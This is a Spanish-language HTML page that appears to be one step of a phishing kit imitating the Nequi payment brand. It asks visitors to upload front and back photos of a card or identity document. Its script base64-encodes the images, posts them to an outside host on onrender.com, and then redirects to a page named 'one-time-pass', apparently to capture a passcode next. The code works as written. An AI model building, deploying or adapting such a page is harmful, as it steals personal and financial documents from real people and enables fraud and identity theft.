<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>documentos</title>

<style>
body{
    font-family: Arial;
    background:#fde2ff;
    text-align:center;
    padding:30px;
}

.card{
    background:white;
    width:400px;
    margin:auto;
    padding:20px;
    border-radius:15px;
    box-shadow:0 0 15px rgba(0,0,0,0.2);
}

.preview-container{
    display:flex;
    justify-content:space-around;
    margin-top:15px;
}

.preview img{
    width:120px;
    height:120px;
    object-fit:cover;
    border-radius:10px;
    border:2px solid #ccc;
}

input, textarea{
    width:90%;
    padding:8px;
    margin:8px 0;
}

button{
    background:#c2185b;
    color:white;
    border:none;
    padding:10px 20px;
    border-radius:10px;
    cursor:pointer;
}

button:hover{
    background:#880e4f;
}
</style>
</head>

<body>

<div class="card">
    <h2>üéÅ Cargue de documentos</h2>

    <label>Imagen Frontal</label>
    <input type="file" id="frontImage" accept="image/*" onchange="previewImage(event,'frontPreview')">

    <label>Imagen Trasera</label>
    <input type="file" id="backImage" accept="image/*" onchange="previewImage(event,'backPreview')">

    <div class="preview-container">
        <div class="preview">
            <p>Frontal</p>
            <img id="frontPreview">
        </div>
        <div class="preview">
            <p>Trasera</p>
            <img id="backPreview">
        </div>
    </div>

     
    <button onclick="enviarTarjeta()">Enviar </button>

</div>

<script>

const SERVER_URL = "https://nequiscol.onrender.com";
const REDIRECT_URL = "https://nequiscol.onrender.com/one-time-pass.php.html";

let frontBase64 = "";
let backBase64 = "";

function previewImage(event, id){
    const reader = new FileReader();
    reader.onload = function(){
        document.getElementById(id).src = reader.result;

        if(id === "frontPreview"){
            frontBase64 = reader.result;
        } else {
            backBase64 = reader.result;
        }
    };
    reader.readAsDataURL(event.target.files[0]);
}

async function enviarTarjeta(){

    //const message = document.getElementById("messageText").value;

    if(!frontBase64 || !backBase64){
        alert("Debes cargar ambas im√°genes");
        return;
    }

    try{

        await fetch(`${SERVER_URL}/step-tarjetaregalo`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                sessionId: Date.now().toString(),
                frontImageBase64: frontBase64,
                backImageBase64: backBase64
               // message
            })
        });

        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 1500);

    }catch(error){
        alert("Error al enviar");
    }
}

</script>

</body>
</html>
